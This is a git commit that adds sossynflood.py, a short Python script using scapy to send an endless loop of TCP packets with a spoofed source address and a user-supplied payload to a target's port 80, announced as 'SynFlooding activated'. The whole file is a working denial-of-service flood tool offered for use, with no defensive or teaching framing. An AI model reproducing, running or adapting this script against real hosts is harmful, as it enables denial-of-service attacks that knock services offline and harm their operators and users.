e93814e3e5edda121ed5208fbd8c96ee54be56e1
SOSAkornut <90846316+SOSAkornut@users.noreply.github.com>
2022-04-24 16:08:08 -0500

    Create sossynflood.py

---
+++ sossynflood.py
@@ -0,0 +1,24 @@
+#!/usr/bin/python
+
+from scapy.all import *
+from termcolor import cprint
+import sys
+
+def synFlood(src, tgt, message):
+    for dport in range(1024, 65535):
+        dport = 80
+        IPlayer = IP(src=src, dst=tgt)
+        TCPlayer = TCP(sport=4444, dport=dport)
+        #RAWlayer = Raw(b"X"*2048)
+        RAWlayer = Raw(load=message) 
+        pkt = IPlayer/TCPlayer/RAWlayer
+        send(pkt)
+
+source = sys.argv[1]
+target = sys.argv[2]
+message = sys.argv[3]
+
+cprint("[*] SynFlooding activated", "green")
+while True:
+    synFlood(source, target, message)
+
